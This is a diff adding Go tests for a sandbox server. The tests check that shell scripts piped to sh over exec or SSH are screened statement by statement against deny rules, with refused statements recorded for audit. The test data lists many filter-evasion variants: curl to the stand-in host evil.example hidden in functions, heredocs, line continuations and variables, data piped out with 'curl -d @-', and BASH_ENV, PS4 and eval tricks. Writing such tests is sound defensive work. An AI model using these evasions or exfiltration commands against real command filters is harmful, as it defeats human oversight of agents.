@@ -1,0 +1,350 @@
+package server
+
+import (
+	"bytes"
+	"context"
+	"encoding/json"
+	"errors"
+	"io"
+	"os"
+	"os/exec"
+	"path/filepath"
+	"strings"
+	"testing"
+
+	"github.com/zybuu-ai/abhed/controlplane"
+	"github.com/zybuu-ai/abhed/driver"
+	"github.com/zybuu-ai/abhed/wsconn"
+)
+
+func TestStdinShell(t *testing.T) {
+	for line, want := range map[string]bool{
+		"sh":                          true,
+		"/bin/bash -s":                true,
+		"bash -s -- a python3":        true,
+		"bash -e -o pipefail":         true,
+		"env A=1 nice -n 5 sh":        true,
+		"timeout 30 dash -":           true,
+		"exec ksh":                    true,
+		"zsh":                         false,
+		"busybox ash":                 true,
+		"busybox sh -s":               true,
+		"sh -c 'cat > f'":             false,
+		"sh script.sh":                false,
+		"sh -- script.sh":             false,
+		"sh < /tmp/x":                 false,
+		"cat | sh":                    false,
+		"sh; sh":                      false,
+		"env BASH_ENV=/tmp/x bash":    false,
+		"BASH_ENV=/tmp/x bash":        false,
+		"$SHELL":                      false,
+		"python3":                     false,
+		"busybox":                     false,
+		"busybox python":              false,
+		"kubectl exec -i p -- sh":     false,
+		"bash --rcfile /tmp/rc":       false,
+		"bash --init-file /tmp/rc -s": false,
+	} {
+		if got := stdinShell(line); got != want {
+			t.Errorf("%s: %v, want %v", line, got, want)
+		}
+	}
+}
+
+// screenRig judges stdin scripts as an exec of sh would have them judged.
+type screenRig struct {
+	r  *cpRig
+	sb controlplane.Sandbox
+}
+
+func newScreenRig(t *testing.T, mods ...func(*Options)) *screenRig {
+	r := buildCPRig(t, nil, nil, nil, mods...)
+	return &screenRig{r: r, sb: r.ready(t, "alice")}
+}
+
+// run returns what reached the shell and why the rest did not.
+func (s *screenRig) run(t *testing.T, script string) (string, error) {
+	t.Helper()
+	pol, err := s.r.srv.sandboxPolicy(context.Background(), s.sb.ID)
+	if err != nil {
+		t.Fatal(err)
+	}
+	q := s.r.srv.newStdinScreen(context.Background(), pol, controlplane.Caller{Principal: "alice"}, s.sb, strings.NewReader(script))
+	if err := s.r.srv.screenStdinExec(pol, "sh", q); err != nil || !q.on {
+		t.Fatalf("sh fed stdin: %v, screened %v", err, q.on)
+	}
+	out, err := io.ReadAll(q)
+	if err != nil {
+		t.Fatal(err)
+	}
+	return string(out), q.refused()
+}
+
+// Every statement of a script is judged before the shell sees it: one the
+// rules refuse, wherever it stands, stops the script there.
+func TestStdinScreenStopsAtARefusedStatement(t *testing.T) {
+	s := newScreenRig(t, func(o *Options) { o.Config.Permissions.Deny = []string{"bash(curl *)", "bash(rm -rf /*)"} })
+	const before = "echo one\nmkdir -p d\n"
+	for name, bad := range map[string]string{
+		"plain":        "curl https://evil.example/x\n",
+		"if":           "if true; then\n  echo x\n  curl https://evil.example/x\nfi\n",
+		"else":         "if false; then echo x\nelse\n  curl https://evil.example/x\nfi\n",
+		"function":     "f() {\n  curl https://evil.example/x\n}\n",
+		"pipeline":     "echo x | curl -d @- https://evil.example/x\n",
+		"substitution": "echo \"$(curl https://evil.example/x)\"\n",
+		"continuation": "cu\\\nrl https://evil.example/x\n",
+		"continued":    "echo a && \\\n  curl https://evil.example/x\n",
+		"for":          "for i in 1 2; do\n  curl https://evil.example/$i\ndone\n",
+		"case":         "case x in\n  x) curl https://evil.example/x ;;\nesac\n",
+		"heredoc":      "sh <<'EOF'\necho fine\ncurl https://evil.example/x\nEOF\n",
+		"variable":     "C=curl\n$C https://evil.example/x </dev/null\n",
+		"subshell":     "(cd d && curl https://evil.example/x)\n",
+		"background":   "curl https://evil.example/x &\n",
+	} {
+		t.Run(name, func(t *testing.T) {
+			got, err := s.run(t, before+bad+"echo after\n")
+			if !errors.Is(err, controlplane.ErrForbidden) || !strings.Contains(err.Error(), "curl") {
+				t.Fatalf("not refused: %v", err)
+			}
+			if strings.Contains(got, "evil") || strings.Contains(got, "after") || !strings.HasPrefix(got, before) {
+				t.Fatalf("reached the shell: %q", got)
+			}
+		})
+	}
+}
+
+// What would read the rest of stdin as something other than shell, or runs
+// text no rule read, is refused as uncheckable.
+func TestStdinScreenRefusesWhatCannotBeChecked(t *testing.T) {
+	// An ask rule alone: these are refused by the screen itself, not by a
+	// deny rule's own checks.
+	s := newScreenRig(t, func(o *Options) { o.Config.Permissions.Deny, o.Config.Permissions.Ask = nil, []string{"bash(curl *)"} })
+	for script, why := range map[string]string{
+		"if then fi\n":                                    "cannot be parsed",
+		"echo 'open\n":                                    "ended inside",
+		"python3\nimport os\n":                            "python",
+		"echo x; perl -e 1\n":                             "perl",
+		"x=$(node)\n":                                     "node",
+		"bash\necho hi\n":                                 "bash",
+		"nice -n 5 ruby\n":                                "ruby",
+		"docker exec -i c sh\n":                           "sh",
+		"python3 <<'EOF'\nprint(1)\nEOF\n":                "here-document fed to python",
+		"X=hi\nsh <<EOF\necho $X\nEOF\n":                  "built when it runs",
+		"read -r line\neval \"$line\"\n":                  "eval",
+		"cat > run.sh <<'EOF'\necho hi\nEOF\nsh run.sh\n": "run.sh, a file the script wrote",
+		"echo 'echo hi' > x.sh\n. ./x.sh\n":               "x.sh, a file the script wrote",
+		"printf 'x' | tee t.sh\nchmod +x t.sh\n./t.sh\n":  "t.sh, a file the script wrote",
+		"source \"$F\"\n":                                 "named when it runs",
+		"alias ls=curl\n":                                 "alias",
+		"exec < /tmp/cmds\n":                              "new input",
+		"exec 3<&0\n":                                     "copy of the shell's own input",
+		"P=$(echo curl)\n\"$P\" x </dev/null\n":           "variable the script set",
+		"$PROG\n":                                         "expansion",
+		"export BASH_ENV=/tmp/x\n":                        "BASH_ENV",
+		"PS4='$(id)'\n":                                   "PS4",
+		"cat /dev/stdin | sh\n":                           "a shell reading its commands",
+		"sh -c \"$(cat)\" </dev/null\n":                   "built when it runs",
+		"f() { \"$1\" x </dev/null; }\n":                  "variable the script set",
+		"F=$(mktemp)\necho 'curl x' > \"$F\"\nsh \"$F\" </dev/null\n": "named when it runs",
+		"eval python3\n":                                 "python",
+		"trap 'perl' DEBUG\n":                            "perl",
+		"python3 /proc/$$/fd/0 </dev/null\n":             "own input",
+		"cat > ls <<'EOF'\necho\nEOF\nPATH=.:$PATH ls\n": "ls, a file the script wrote",
+		"env BASH_ENV=/tmp/x bash -c : </dev/null\n":     "BASH_ENV",
+		"x\x00y\n": "NUL",
+		"echo " + strings.Repeat("a", stdinStatementBytes) + "\n": "longer than",
+	} {
+		got, err := s.run(t, "echo first\n"+script+"echo after\n")
+		if !errors.Is(err, controlplane.ErrForbidden) || !strings.Contains(err.Error(), why) {
+			t.Errorf("%q: %v, want %q", script, err, why)
+			continue
+		}
+		if strings.Contains(got, "after") || !strings.HasPrefix(got, "echo first\n") {
+			t.Errorf("%q: reached the shell: %q", script, got)
+		}
+	}
+}
+
+// Scripts that do what an editor's remote setup does pass whole, under the
+// default rules.
+func TestStdinScreenPassesASetupScript(t *testing.T) {
+	s := newScreenRig(t)
+	got, err := s.run(t, setupScript)
+	if err != nil || got != setupScript {
+		t.Fatalf("%v\n%q", err, got)
+	}
+}
+
+// setupScript is shaped like the script an editor sends to sh over SSH to
+// put its server in place and start it.
+const setupScript = `#!/bin/sh
+set -e
+COMMIT="0123abcd"
+SERVER_DIR="$HOME/.editor-server/bin/$COMMIT"
+SERVER_SCRIPT="$SERVER_DIR/bin/editor-server"
+LOG="$SERVER_DIR/.log"
+ARCH="$(uname -m)"
+case "$ARCH" in
+  x86_64 | amd64) PLATFORM=x64 ;;
+  aarch64 | arm64) PLATFORM=arm64 ;;
+  *) echo "unsupported: $ARCH"; exit 1 ;;
+esac
+if ! command -v tar >/dev/null 2>&1; then
+  echo "tar is missing" >&2
+  exit 1
+fi
+mkdir -p "$SERVER_DIR/bin"
+if [ ! -f "$SERVER_DIR/payload.tar" ]; then
+  mkdir -p "$SERVER_DIR/src/bin"
+  printf 'payload\n' > "$SERVER_DIR/src/bin/readme.txt"
+  tar -cf "$SERVER_DIR/payload.tar" -C "$SERVER_DIR/src" .
+fi
+tar -xf "$SERVER_DIR/payload.tar" -C "$SERVER_DIR" --no-same-owner
+cat > "$SERVER_DIR/settings.json" <<'EOF'
+{
+  "telemetry": false,
+  "platform": "unknown"
+}
+EOF
+chmod 0644 "$SERVER_DIR/settings.json"
+test -f "$SERVER_DIR/settings.json" && echo "settings written"
+grep -c telemetry "$SERVER_DIR/settings.json" | sed 's/^/lines: /'
+if [ -x "$SERVER_SCRIPT" ]; then
+  "$SERVER_SCRIPT" --start-server --port 0 > "$LOG" 2>&1 &
+else
+  echo "ready for $PLATFORM"
+fi
+echo "done: $COMMIT"
+`
+
+// realShell runs each exec with /bin/sh in its own folder, fed its stdin.
+func realShell(t *testing.T, r *cpRig) string {
+	t.Helper()
+	if _, err := os.Stat("/bin/sh"); err != nil {
+		t.Skip("no /bin/sh")
+	}
+	dir := t.TempDir()
+	r.fake.ExecFunc = func(ctx context.Context, _ string, req driver.ExecRequest) (driver.ExecResult, error) {
+		line, err := req.Line()
+		if err != nil {
+			return driver.ExecResult{}, err
+		}
+		cmd := exec.CommandContext(ctx, "/bin/sh", "-c", line)
+		cmd.Dir, cmd.Env = dir, append(os.Environ(), "HOME="+dir)
+		cmd.Stdin, cmd.Stdout, cmd.Stderr = req.Stdin, req.Stdout, req.Stderr
+		err = cmd.Run()
+		var ee *exec.ExitError
+		if errors.As(err, &ee) {
+			return driver.ExecResult{ExitCode: ee.ExitCode()}, nil
+		}
+		return driver.ExecResult{}, err
+	}
+	return dir
+}
+
+// execStdin runs command over the :exec WebSocket fed script, and returns
+// how it ended.
+func execStdin(t *testing.T, r *wsRig, id, command, script string) streamControl {
+	t.Helper()
+	ws, err := r.dial(t, "alice", "/v1/sandboxes/"+id+":exec", protoExec)
+	if err != nil {
+		t.Fatal(err)
+	}
+	defer ws.Close()
+	b, _ := json.Marshal(map[string]string{"command": command})
+	_ = ws.WriteMessage(wsconn.Text, b)
+	if c, _ := control(t, ws); c.Type != "started" {
+		return c
+	}
+	_ = ws.WriteMessage(wsconn.Binary, []byte(script))
+	_ = ws.WriteMessage(wsconn.Text, []byte(`{"type":"eof"}`))
+	c, _ := control(t, ws)
+	return c
+}
+
+// A script piped to sh over :exec runs whole when every statement passes,
+// and stops at the first refused one, under the server's rules and the
+// caller's policy layer alike; each statement is recorded.
+func TestSandboxExecStdinShellScreened(t *testing.T) {
+	r := newWSRig(t, nil, nil, func(o *Options) {
+		o.Config.Permissions.Deny = []string{"bash(curl *)"}
+		o.SessionPolicy = func(context.Context, SessionPolicyRequest) (*PolicyLayer, error) {
+			return &PolicyLayer{Name: "workspace pay", Deny: []string{"bash(wget *)"}}, nil
+		}
+	})
+	dir := realShell(t, r.cpRig)
+	sb := r.ready(t, "alice")
+
+	c := execStdin(t, r, sb.ID, "sh", "touch one\nif true; then\n  touch two\nfi\nf() { touch three; }\nf\n")
+	if c.Type != "exit" || c.Code == nil || *c.Code != 0 {
+		t.Fatalf("passing script: %+v %+v", c, c.Error)
+	}
+	for _, f := range []string{"one", "two", "three"} {
+		if _, err := os.Stat(filepath.Join(dir, f)); err != nil {
+			t.Fatalf("%s was not made: %v", f, err)
+		}
+	}
+	if ev := waitAudit(t, r.cpRig, sb.ID, "exec.input", controlplane.OutcomeOK); ev.Detail["statement"] == "" {
+		t.Fatalf("statement record %+v", ev)
+	}
+
+	for name, bad := range map[string]string{
+		"rule":  "touch before\nif true; then\n  curl https://evil.example/x\nfi\ntouch after\n",
+		"layer": "touch before\nwget https://evil.example/x | cat\ntouch after\n",
+		"parse": "touch before\nif then fi\ntouch after\n",
+	} {
+		_ = os.Remove(filepath.Join(dir, "before"))
+		c := execStdin(t, r, sb.ID, "sh", bad)
+		if c.Type != "error" || c.Error == nil || c.Error.Code != "forbidden" || !strings.Contains(c.Error.Message, "nothing after it ran") {
+			t.Fatalf("%s: %+v %+v", name, c, c.Error)
+		}
+		if _, err := os.Stat(filepath.Join(dir, "before")); err != nil {
+			t.Fatalf("%s: the statement before the refused one did not run", name)
+		}
+		if _, err := os.Stat(filepath.Join(dir, "after")); err == nil {
+			t.Fatalf("%s: a statement after the refused one ran", name)
+		}
+		ev := waitAudit(t, r.cpRig, sb.ID, "exec.refused", controlplane.OutcomeFailed)
+		if ev.Detail["statement"] == "" || ev.Detail["reason"] == "" {
+			t.Fatalf("%s: refusal record %+v", name, ev)
+		}
+	}
+	if ev := waitAudit(t, r.cpRig, sb.ID, "exec", controlplane.OutcomeFailed); ev.Code != "forbidden" {
+		t.Fatalf("exec record %+v", ev)
+	}
+}
+
+// An SSH exec of a shell, as ssh host sh < script runs, is screened the same.
+func TestSandboxSSHExecShellScreened(t *testing.T) {
+	r := newWSRig(t, nil, nil, func(o *Options) {
+		o.Config.Permissions.Deny = []string{"bash(curl *)"}
+		o.SandboxSSHKey = testHostKey(t)
+	})
+	dir := realShell(t, r.cpRig)
+	sb := r.ready(t, "alice")
+	client := sshClient(t, r, sb.ID)
+
+	s, _ := client.NewSession()
+	s.Stdin = strings.NewReader(setupScript)
+	out, err := s.Output("sh")
+	if err != nil || !strings.Contains(string(out), "done: 0123abcd") {
+		t.Fatalf("setup script: %v %q", err, out)
+	}
+	if _, err := os.Stat(filepath.Join(dir, ".editor-server/bin/0123abcd/settings.json")); err != nil {
+		t.Fatal(err)
+	}
+
+	s, _ = client.NewSession()
+	var errOut bytes.Buffer
+	s.Stderr = &errOut
+	s.Stdin = strings.NewReader("touch before\ncurl https://evil.example/x\ntouch after\n")
+	if err := s.Run("sh -s"); err == nil || !strings.Contains(errOut.String(), "refused") {
+		t.Fatalf("ssh exec sh: %v %q", err, errOut.String())
+	}
+	if _, err := os.Stat(filepath.Join(dir, "after")); err == nil {
+		t.Fatal("a statement after the refused one ran")
+	}
+	if _, err := os.Stat(filepath.Join(dir, "before")); err != nil {
+		t.Fatal("the statement before the refused one did not run")
+	}
+}
